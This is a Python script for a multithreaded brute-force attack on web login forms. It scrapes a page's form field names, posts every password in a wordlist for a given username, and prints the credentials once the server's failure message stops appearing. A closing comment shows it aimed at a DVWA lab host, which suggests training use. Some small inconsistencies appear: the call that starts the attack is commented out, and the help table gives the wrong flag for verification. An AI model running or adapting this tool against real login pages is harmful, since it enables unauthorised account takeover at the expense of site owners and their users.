import optparse
import threading
import time
from tabulate import tabulate
from important_static_functions import *


class BruteForce:
    threads = []

    def __init__(self):
        parser = optparse.OptionParser()
        # """Setting up command line arguments."""
        parser.add_option('-u', '--url', dest='url')
        # """ Adding option of URL. The URl which has to be attacked"""
        parser.add_option('-p', '--passwords', dest='passwords')
        # """Adding option of passwords list. The list of possible password to try."""
        parser.add_option('-t', '--threads', dest='threads')
        # """No of threads to be used."""
        parser.add_option('-l', '--login_name', dest='login_name')
        # """Adding option of username. This username must be valid in order to gain password."""
        parser.add_option('-y', '--verification', dest='verification')
        # """ Adding option of verification.
        #    Verification of the password:
        #            Example:
        #                    "Incorrect Credentials" => response of server, means the Credentials are incorrect.
        #                     If  "Incorrect Credentials" not in response => Login successful"""
        parser.add_option('-v', '--verbose', dest='verbose', action="store_false")
        # """Verbose Mode: Show Error and Request in real time """
        (options, argument) = parser.parse_args()
        # """Parsing The Arguments"""
        # """Important Fields =>"""
        self.url = options.url
        self.threads_num = options.threads
        if self.threads_num is None:
            self.threads_num = 10
        self.passwords_list = options.passwords
        self.username = options.login_name
        self.verification = options.verification
        self.verbose = options.verbose
        # """Verification Of This Important Fields:"""
        if self.url is None or self.passwords_list is None or self.username is None or self.verification is None:
            print(error('Proper Arguments Not Given:'))
            print(self.script_usage())
            sys.exit(0)

        self.start = time.time()
        self.creds_found = False
        self.end = time.time()
        self.stop_event = threading.Event()

        self.username_field = ''
        self.password_field = ''
        self.submit_field_name = ''

    @staticmethod
    def script_usage():
        # """
        # Colored Table That Show a small simple Guide for using this program.
        # """
        my_data = [
            [colored("Username", 'yellow'), colored("-l", 'green'), colored("A valid Username Not Given.", 'red')],
            [colored("Passwords", 'yellow'), colored("-p", 'green'), colored("List Of Possible Passwords.", 'red')],
            [colored("URL", 'yellow'), colored("-u", 'green'), colored("Website Want to Attack.", 'red')],
            [colored("Threads", 'yellow'), colored("-t", 'green'), colored("No if Threads To Use", 'red')],
            [colored("Verification", 'yellow'), colored("-v", 'green'), colored("To Verify if login is made", 'red')]]
        head = [colored("Name", 'blue'), colored("Arguments", 'blue'), colored("Help", 'blue')]
        return tabulate(my_data, headers=head)

    def extraction(self, form):
        # """
        # Declaring Password Field and Username Field as Empty.
        # """
        password_field_name = ''
        username_field_name = ''
        # # """
        # Extracting Form Action and Method, storing in variable, 'action' and 'method'.
        # # """
        action, method = (get_form_action_and_method(form))
        print(success(f'Action: {action}, Method: {method}'))
        # """
        # Extracting all inputs tag, from form.
        # """
        inputs = getting_specify_tags(form, 'input')
        buttons = getting_specify_tags(form, 'button')
        # """
        # Extracting Tag Type and Name, storing  in variable, 'tag_type', and 'tag_name'
        # """
        tag_types, tag_names = extracting_tags_attributes(inputs, 'type', 'name')
        check_box = getting_check_box(buttons, 'type', 'name')
        # """
        # Condition ->
        #    Checking length of tag_type and tag_name.
        # """
        if len(tag_types) < 3 and len(tag_names) < 3:
            # """
            # Printing types and names in a better format.
            # """
            for types, names in zip(tag_types, tag_names):
                if types == 'password':
                    password_field_name, self.password_field = names, names
                else:
                    username_field_name, self.username_field = names, names
            print(success(f'Password Field: "{password_field_name}"'))
            print(success(f'Username Field: "{username_field_name}"'))
            try:
                print(success(f'Checkbox: "{check_box}"'))
            except IndexError:
                print(success(f'[+] No checkbox found'))
            # """
            # try/except :
            #    Printing Submit Input/Button Name:
            #    If/Else For Verbose Mode.
            # """
            try:
                submit = getting_submit_input(inputs)
                submit, self.submit_field_name = submit[0][1], submit[0][1]
                if submit is None:
                    submit = ''
                    print(success(f'Submit Button Name: {submit}\n\n', 'blue'))
                    sys.exit(0)
                print(success(f'Submit Button Name: {submit}\n\n', 'blue'))
                # self.brute_force()
            except IndexError:
                print(error(f'Cannot Find The Submit Input Field Name'))
                button_type, button_name = getting_button_id(form)
                if (button_type, button_name) == (False, False):
                    print(error("Cannot Find The Submit Button Field ID."))
                else:
                    print(success(f"Submit Button ID => {button_name}"))
        else:
            # """
            # Exiting due to more than two inputs fields.
            # """
            print(error(f'More Than two inputs Field Found, Please use Manual mode.'))
            field = 1
            # """
            # For more information, printing the inputs in a better format.
            # """
            for types, names in zip(tag_types, tag_names):
                print(error(f'Input Name: "{names}"' + colored(f" <= Field number {field}", 'blue')))
                field += 1
            sys.exit(0)

    def main(self):
        # """
        # Extracting Forms and storing in a list, called 'forms'
        # """
        forms = getting_forms(request(self.url), 'form')
        # """
        # Verifying the length of forms.
        # """
        if len(forms) == 1:
            # """
            # Iterating over each form.
            # """
            for form in forms:
                self.extraction(form)
        elif len(forms) > 1:
            # """
            # If the length is greater than 1. Then option of using which form to use.
            # """
            form_index = 0
            print(colored(f'[!] More Than One Form Found, Total Forms: {len(forms)}', 'red'))
            for form in forms:
                main_line_of_forms = str(form).split('>')[0]
                print(colored(f"[+] Form Index: [{form_index}]\n\tForm Data:", 'green') +
                      colored(f"\n\t{main_line_of_forms}", 'yellow'))
                form_index += 1
            print((colored('[+] Index Of Form To Search: ', 'blue')))
            form_to_search = input('')
            try:
                form = forms[int(form_to_search)]
                self.extraction(form)
            except IndexError:
                print(colored(f'[-] Form With Index {form_to_search} Not Found.', 'red'))
                sys.exit(0)
            except ValueError:
                print(colored('[-] Integer Required.', 'red'))
                sys.exit(0)
        else:
            print(error(f'More Than One Form Found: {len(forms)}'))

    def proper_response(self, data, word, number):
        # """
        # Check For The Creds.
        # """
        if self.creds_found:
            return
        # """
        # Posting Give DataTo The Given URL. And storing The Response in variable, 'response'.
        # """
        response = brute_force_request(self.url, data=data, timeout=5)
        # """
        # Checking The Response If login is successful or not.
        # """
        if self.verification in response.content.decode('utf-8'):
            # """
            # If Verbose Mode is True, then printing the following request. Else , not printing.
            # """
            if self.verbose is not None:
                print(f'\rWorking On {number}\t\tPassword Invalid "{word}"\n', end='')
            else:
                pass
        else:
            # """
            # If login is successful, then printing the Creds In Proper Manner.
            # """
            self.end = time.time()
            print(f'\rWorking On {number}\t\tPassword Found "{word}"\n', end='')
            self.creds_found = True
            time.sleep(3)
            print("\n\n")
            print(colored(f"[*] Total time - {self.end - self.start} seconds.\n", 'yellow'))
            print(colored(f"Credentials for ", 'blue') + colored(f"{self.url}\n", 'green') +
                  colored(f"Username: ", 'blue') + colored(f"{self.username}\n", 'green') +
                  colored("Password: ", 'blue') + colored(f"{word}", 'green'))

    def brute_force(self):
        # """
        # Checking The Connection Of The Website.
        # """
        connection_check(self.url)
        number = 1
        # """
        # Reading Password From The Wordlist
        # """
        words = read(self.passwords_list)
        # """
        # Iterating over each word in the list.
        # """
        for word in words:
            # """
            # Checking If The Creds Are Found. If so then breaking the loop. And Stop all the threads.
            # """
            if self.creds_found:
                self.exit()
            # """
            # Cleaning The Word From The Special Characters.
            # """
            word = clean_word(word)
            # """
            # Preparing The Dictionary Of Data To Post.
            # """
            data = {
                self.username_field: self.username,
                self.password_field: word,
                self.submit_field_name: 'submit'
            }
            # """
            # Creating The Thread.
            # """
            thread = threading.Thread(target=self.proper_response, args=(data, word, number))
            # """
            # Appending The Thread To The Total Threads List.
            # """
            self.threads.append(thread)
            # """
            # Not letting the thread to Increase the Its Number From The Give Total Threads.
            # """
            try:
                while threading.active_count() > self.threads_num + 1:
                    continue
            except KeyboardInterrupt:
                sys.exit(0)
            # """
            # Starting The Thread.
            # """
            thread.start()
            number += 1
        # """
        # If The Creds Are Not Found, Then Close All The Threads. And Exit Properly.
        # """
        self.exit()

    def collection_of_threads(self):
        # """
        # Joining All The Threads.
        # """
        for thread in self.threads:
            try:
                thread.join()
            except RuntimeError:
                pass

    def exit(self):
        # """
        # Exiting The Program Properly.
        # """
        if not self.creds_found:
            success("\n[!] Closing And Quiting All Running Threads.", 'blue')

        self.collection_of_threads()

        if not self.creds_found:
            error(f"[!] Failed to find valid credentials for {self.url}")
            self.end = time.time()
            success(f"[*] Total time - {self.end - self.start} seconds.", 'blue')
        sys.exit()


if __name__ == '__main__':
    fix_color_output()  # Fix Color Output in windows/linux.
    BruteForce().main()
    # -l admin -p "../../../Wordlist/passwords1.txt" -u "http://192.168.56.101/dvwa/login.php" -t 15 -y "Login failed"
